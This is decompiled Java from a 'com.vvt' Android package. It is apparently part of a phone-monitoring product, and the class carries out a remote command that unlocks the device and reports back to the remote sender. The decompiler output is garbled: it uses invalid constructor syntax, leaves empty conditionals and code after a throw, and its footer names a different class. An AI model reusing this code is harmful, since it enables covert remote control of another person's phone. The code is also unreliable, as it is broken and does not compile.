package com.vvt.remotecommand.processor.e;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import java.util.ArrayList;

public class c
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void b(RemoteCommand paramRemoteCommand, com.vvt.remotecommand.processor.c paramc)
  {
    Object localObject1 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject1).<init>();
    Object localObject2 = RemoteFunction.SET_UNLOCK_DEVICE;
    ((ControlCommand)localObject1).setFunction((RemoteFunction)localObject2);
    boolean bool1 = a;
    if (bool1) {}
    localObject2 = h();
    ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    if (paramc != null)
    {
      boolean bool2 = a;
      if (bool2) {}
      localObject1 = "The device is unlocked.";
      paramc.b(paramRemoteCommand, this, (String)localObject1);
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, com.vvt.remotecommand.processor.c paramc)
  {
    boolean bool1 = false;
    InvalidCommanFormatException localInvalidCommanFormatException = null;
    boolean bool2 = a;
    if (bool2) {}
    ArrayList localArrayList = paramRemoteCommand.getParameters();
    boolean bool3 = a;
    if ((!bool3) || (localArrayList == null))
    {
      bool2 = false;
      localArrayList = null;
    }
    for (;;)
    {
      if (!bool2) {
        bool1 = true;
      }
      bool2 = a;
      if ((bool2) && (bool1)) {
        break;
      }
      localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
      int i = localArrayList.size();
    }
    b(paramRemoteCommand, paramc);
    bool1 = a;
    if (bool1) {}
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcSetLockDevice";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/e/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */